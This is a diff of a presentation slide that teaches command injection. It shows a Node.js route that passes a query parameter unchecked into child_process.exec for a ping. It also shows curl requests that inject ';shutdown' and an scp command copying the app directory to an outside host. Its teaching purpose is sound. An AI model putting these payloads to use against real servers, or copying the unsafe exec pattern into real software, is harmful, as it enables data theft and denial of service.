@@ -6,25 +6,27 @@
       user input to an interpreter as part of a command or query.
     </li>
   </ul>
-  <div style="font-size: 0.6em; display: grid; grid-template-columns: 60% 40%">
+  <div style="font-size: 0.6em; display: grid; grid-template-columns: 35% 65%">
+    <pre>
+      <code class="js" data-trim contenteditable>
+    ...
+    // check website availability
+    app.get('/', async (req, res) {
+    await child_process.exec(
+    'ping ' + req.query.domain);
+    ...
+    })
+    ...
+      </code>
+    </pre>
     <div>
       <pre>
         <code class="bash">
-curl http://www.ex.com/?file=app.js
-curl http://www.ex.com/?file=;shutdown
-curl http://www.ex.com/?file=;scp%20-r%20.%20root@315.32.2.1:/home
+curl http://www.ping.com/?domain=google.com
+curl http://www.ping.com/?domain=;shutdown
+curl http://www.ping.com/?domain=;scp%20-r%20.%20root@315.32.2.1:/home
         </code>
       </pre>
     </div>
-    <pre>
-      <code class="js" data-trim contenteditable>
-...
-app.get('/', async (req, res) {
-  await child_process.exec(
-    'gzip ' + req.query.file);
-})
-...
-      </code>
-    </pre>
   </div>
 </section>
